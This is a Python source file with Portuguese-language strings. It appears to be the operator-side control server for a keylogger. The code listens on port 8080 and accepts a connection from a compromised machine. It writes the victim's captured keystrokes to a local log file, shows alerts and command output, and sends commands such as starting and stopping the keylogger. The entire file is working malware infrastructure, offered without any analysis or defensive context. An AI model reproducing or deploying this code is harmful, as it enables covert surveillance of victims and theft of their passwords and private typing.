import socket, os, threading, json

help = """-----------------------------
INICIAR KEYLOGGER --> start keylogger
PARAR KEYLOGGER --> stop keylogger
SAIR --> exit
-----------------------------
"""
def recv_data():
    while True:
        try:
            data = con.recv(1024)
        except OSError:
            exit(0)
        if data:
            while True:
                try:
                    data = json.loads(data.decode())
                    break
                except:
                    data += con.recv(1024)
            if "tecla" in data:
                with open("logs.txt", "a") as f:
                    f.write(data["tecla"] + "\n")
            elif "alerta" in data:
                print(f"\r[!]{data["alerta"]}\n> ", end="")
            elif "comando" in data:
                print(f"\r{data["comando"]}\n> ", end="")
def send_data():
    while True:
        try:
            raw_data = input("> ")
            sock.send(raw_data.encode())
            
            if raw_data == "help":
                print(help)
            elif raw_data == "clear":
                os.system("clear")
                print(f"Conectado com {client}")
            elif raw_data == "exit":
                sock.close()
                exit(0)
        except OSError:
            os.system("clear")
            print("Conexão encerrada..")
            os._exit(0)

        
def startS():
    global con, client
    os.system("clear")
    s = socket.socket()
    try:
        s.bind(("0.0.0.0", 8080))
    except OSError:
        os.system("clear")
        print("Espere um momento.")
        os._exit(0)
    s.listen()
    print("Esperando conexão..")

    con, client = s.accept()
    os.system("clear")
    print(f"Conectado com {client}")
    return con

sock = startS()
recv = threading.Thread(target=recv_data,)
send = threading.Thread(target=send_data,)
recv.start()
send.start()
